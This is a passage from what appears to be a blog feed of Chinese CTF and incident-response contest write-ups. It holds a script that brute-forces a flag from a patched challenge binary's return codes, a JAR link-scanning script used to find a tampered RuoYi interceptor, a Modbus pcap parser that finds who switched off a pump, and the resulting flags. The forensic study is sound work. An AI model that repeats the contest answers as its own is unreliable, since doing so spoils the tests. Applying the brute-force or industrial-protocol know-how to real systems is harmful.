CHARSET:<br>        test_guess = current_guess + [char] + [<span class="hljs-string">&quot;A&quot;</span>] * (FLAG_LENGTH - i - <span class="hljs-number">1</span>)<br>        input_data = <span class="hljs-string">&quot;&quot;</span>.join(test_guess).encode()<br>        <br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.run(<br>                [<span class="hljs-string">&quot;./hyperjump_patched&quot;</span>],<br>                <span class="hljs-built_in">input</span>=input_data,<br>                timeout=<span class="hljs-number">10</span>,<br>                capture_output=<span class="hljs-literal">True</span><br>            )<br>            <br>            count = p.returncode<br>            <span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:<br>                 count = FLAG_LENGTH<br>                 <br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>             count = -<span class="hljs-number">1</span> <br>        <span class="hljs-keyword">except</span> Exception:<br>             count = -<span class="hljs-number">1</span><br><br>        res.append((char, count))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>        <span class="hljs-keyword">continue</span><br><br>    max_count = <span class="hljs-built_in">max</span>(r[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> res)<br>    <br>    <span class="hljs-keyword">if</span> max_count &lt;= <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>        <br>    <span class="hljs-keyword">for</span> char, count <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-keyword">if</span> count == max_count:<br>            new_guess = current_guess + [char]<br>            jobs.append((new_guess, i + <span class="hljs-number">1</span>))<br>            current_flag = <span class="hljs-string">&quot;&quot;</span>.join(new_guess)<br>            output_line = <span class="hljs-string">f&quot;[Index <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>:02d&#125;</span>] Testing: <span class="hljs-subst">&#123;current_flag:&lt;&#123;FLAG_LENGTH&#125;</span>&#125; (Max Match: <span class="hljs-subst">&#123;max_count&#125;</span>) | Jobs left: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jobs)&#125;</span>)&quot;</span><br>            sys.stdout.write(<span class="hljs-string">f&quot;\r<span class="hljs-subst">&#123;output_line&#125;</span>&quot;</span>)<br>            sys.stdout.flush()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">50</span>)<br><span class="hljs-keyword">if</span> final_flags:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;🎉 Found ALL passing Flags:&quot;</span>)<br>    <span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>(final_flags)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   -&gt; <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ No complete flag found.&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9673f512ff5afe4e.png"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-10月</title>
    <link href="/2025/10/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-10%E6%9C%88/"/>
    <url>/2025/10/29/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-10%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="ruoyi"><a href="#ruoyi" class="headerlink" title="ruoyi"></a>ruoyi</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_http_links</span>(<span class="hljs-params">text</span>):<br>    pattern = <span class="hljs-string">r&#x27;https?://[^\s&lt;&gt;&quot;&#123;&#125;|\\^`\[\]]+&#x27;</span><br>    <span class="hljs-keyword">return</span> re.findall(pattern, text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file_safe</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尝试使用多种编码读取文件，如果失败则使用二进制方式&quot;&quot;&quot;</span><br>    encodings = [<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;latin-1&#x27;</span>, <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-string">&#x27;gb2312&#x27;</span>]<br>    <span class="hljs-keyword">for</span> enc <span class="hljs-keyword">in</span> encodings:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=enc) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-keyword">return</span> f.read()<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># 二进制读取，忽略无法解码字符</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">return</span> f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search_file_for_http</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;在单个文件中搜索HTTP/HTTPS链接&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        content = read_file_safe(file_path)<br>        <span class="hljs-keyword">if</span> content:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_http_links(content)))  <span class="hljs-comment"># 去重</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_jar</span>(<span class="hljs-params">jar_path, extract_to</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;解压JAR文件&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(jar_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> jar:<br>            jar.extractall(extract_to)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 解压失败: <span class="hljs-subst">&#123;jar_path&#125;</span> | <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_directory_for_jars</span>(<span class="hljs-params">directory</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;扫描目录下所有JAR文件&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> Path(directory).rglob(<span class="hljs-string">&quot;*.jar&quot;</span>)]<br><br><span class="hljs-comment"># ----------------- 主逻辑 -----------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">source_dir, output_dir=<span class="hljs-literal">None</span></span>):<br>    source_path = Path(source_dir)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_path.exists():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 源目录不存在: <span class="hljs-subst">&#123;source_dir&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">if</span> output_dir <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        output_path = source_path / <span class="hljs-string">&quot;jar_extracted&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        output_path = Path(output_dir)<br>    output_path.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📂 源目录: <span class="hljs-subst">&#123;source_path&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📂 解压目录: <span class="hljs-subst">&#123;output_path&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br><br>    jar_files = scan_directory_for_jars(source_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 找到 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span> 个JAR文件\n&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> jar_files:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️  未找到JAR文件&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    results = []<br><br>    <span class="hljs-keyword">for</span> idx, jar_path <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(jar_files, <span class="hljs-number">1</span>):<br>        jar_name = Path(jar_path).name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;idx&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>] 处理: <span class="hljs-subst">&#123;jar_name&#125;</span>&quot;</span>)<br><br>        extract_path = output_path / jar_name.replace(<span class="hljs-string">&#x27;.jar&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        extract_path.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> extract_jar(jar_path, extract_path):<br>            http_found = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> extract_path.rglob(<span class="hljs-string">&quot;*&quot;</span>):<br>                <span class="hljs-keyword">if</span> file.is_file():<br>                    links = search_file_for_http(file)<br>                    <span class="hljs-keyword">if</span> links:<br>                        http_found = <span class="hljs-literal">True</span><br>                        rel_file = file.relative_to(extract_path)<br>                        results.append(&#123;<br>                            <span class="hljs-string">&#x27;jar&#x27;</span>: jar_name,<br>                            <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">str</span>(rel_file),<br>                            <span class="hljs-string">&#x27;links&#x27;</span>: links<br>                        &#125;)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  🔗 <span class="hljs-subst">&#123;rel_file&#125;</span>&quot;</span>)<br>                        <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> links:<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;      → <span class="hljs-subst">&#123;link&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> http_found:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  ℹ️  未找到HTTP链接&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 输出汇总报告</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;📊 搜索完成汇总&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;总JAR文件数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;包含HTTP链接的文件数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span>&quot;</span>)<br><br>    report_file = output_path / <span class="hljs-string">&quot;http_links_report.txt&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(report_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&quot;HTTP链接搜索报告\n&quot;</span>)<br>            f.write(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(<span class="hljs-string">f&quot;总JAR文件数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(jar_files)&#125;</span>\n&quot;</span>)<br>            f.write(<span class="hljs-string">f&quot;包含HTTP链接的文件数: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span>\n\n&quot;</span>)<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>                f.write(<span class="hljs-string">f&quot;\nJAR: <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;jar&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">f&quot;文件: <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;file&#x27;</span>]&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">&quot;链接:\n&quot;</span>)<br>                <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> r[<span class="hljs-string">&#x27;links&#x27;</span>]:<br>                    f.write(<span class="hljs-string">f&quot;  - <span class="hljs-subst">&#123;link&#125;</span>\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📝 报告已保存: <span class="hljs-subst">&#123;report_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 保存报告失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-comment"># ----------------- 命令行入口 -----------------</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;用法: python <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;jar目录&gt; [解压输出目录]&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    source = sys.argv[<span class="hljs-number">1</span>]<br>    output = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    main(source, output)<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/717675491ba2e936.png"></p><p>查看 framework 包 com\ruoyi\framework\interceptor\RepeatSubmitInterceptor.class</p><p><img src="https://img.dkdun.cn/v1/2025/12/92dadbe58ec6daf7.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;preRedirect&#125;</span><br></code></pre></td></tr></table></figure><h1 id="工厂应急"><a href="#工厂应急" class="headerlink" title="工厂应急"></a>工厂应急</h1><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">谁把泵关了？<br>提交格式：flag&#123;<span class="hljs-number">0</span>xtra<span class="hljs-symbol">nsaction_id_0</span>xfu<span class="hljs-symbol">nction_code_0</span>xcoil_address&#125;<br></code></pre></td></tr></table></figure><p>脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap, TCP, Raw<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_modbus</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;解析 Modbus TCP 报文&quot;&quot;&quot;</span><br>    raw = <span class="hljs-built_in">bytes</span>(packet[Raw].load)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(raw) &lt; <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    trans_id = <span class="hljs-built_in">int</span>.from_bytes(raw[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>    func_code = raw[<span class="hljs-number">7</span>]<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;trans_id&quot;</span>: trans_id,<br>        <span class="hljs-string">&quot;func_code&quot;</span>: func_code,<br>        <span class="hljs-string">&quot;data&quot;</span>: raw[<span class="hljs-number">8</span>:]<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_turn_off_pump</span>(<span class="hljs-params">pcap_path</span>):<br>    packets = rdpcap(pcap_path)<br><br>    <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> packets:<br>        <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> pkt.haslayer(Raw):<br>            <span class="hljs-keyword">try</span>:<br>                mod = parse_modbus(pkt)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> mod:<br>                    <span class="hljs-keyword">continue</span><br><br>                func = mod[<span class="hljs-string">&quot;func_code&quot;</span>]<br>                <span class="hljs-keyword">if</span> func <span class="hljs-keyword">in</span> (<span class="hljs-number">5</span>, <span class="hljs-number">15</span>):  <span class="hljs-comment"># 写单线圈 or 写多线圈</span><br>                    data = mod[<span class="hljs-string">&quot;data&quot;</span>]<br>                    coil_addr = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>], <span class="hljs-string">&quot;big&quot;</span>)<br><br>                    <span class="hljs-comment"># 写单线圈 (0x05)</span><br>                    <span class="hljs-keyword">if</span> func == <span class="hljs-number">5</span>:<br>                        value = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>                        <span class="hljs-keyword">if</span> value == <span class="hljs-number">0x0000</span>:  <span class="hljs-comment"># 写 0 -&gt; 关泵</span><br>                            flag = <span class="hljs-string">f&quot;flag&#123;&#123;0x<span class="hljs-subst">&#123;mod[<span class="hljs-string">&#x27;trans_id&#x27;</span>]:04x&#125;</span>_0x<span class="hljs-subst">&#123;func:02x&#125;</span>_0x<span class="hljs-subst">&#123;coil_addr:04x&#125;</span>&#125;&#125;&quot;</span><br>                            <span class="hljs-built_in">print</span>(flag)<br>                            <span class="hljs-keyword">return</span><br><br>                    <span class="hljs-comment"># 写多线圈 (0x0F)</span><br>                    <span class="hljs-keyword">elif</span> func == <span class="hljs-number">15</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-number">5</span>:<br>                        qty = <span class="hljs-built_in">int</span>.from_bytes(data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>], <span class="hljs-string">&quot;big&quot;</span>)<br>                        byte_count = data[<span class="hljs-number">4</span>]<br>                        coil_data = data[<span class="hljs-number">5</span>:<span class="hljs-number">5</span>+byte_count]<br>                        bits = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:08b&#125;</span>&#x27;</span>[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> coil_data)<br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(qty):<br>                            <span class="hljs-keyword">if</span> bits[i] == <span class="hljs-string">&#x27;0&#x27;</span>:  <br>                                flag = <span class="hljs-string">f&quot;flag&#123;&#123;0x<span class="hljs-subst">&#123;mod[<span class="hljs-string">&#x27;trans_id&#x27;</span>]:04x&#125;</span>_0x<span class="hljs-subst">&#123;func:02x&#125;</span>_0x<span class="hljs-subst">&#123;coil_addr+i:04x&#125;</span>&#125;&#125;&quot;</span><br>                                <span class="hljs-built_in">print</span>(flag)<br>                                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 未发现关泵操作。&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用法: python find_who_turned_off_pump_final.py traffic.pcap&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    find_turn_off_pump(sys.argv[<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">0</span>x1a2b_0x05_0x000d&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">被写入的 NodeId<br></code></pre></td></tr></table></figure><p>AI脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> 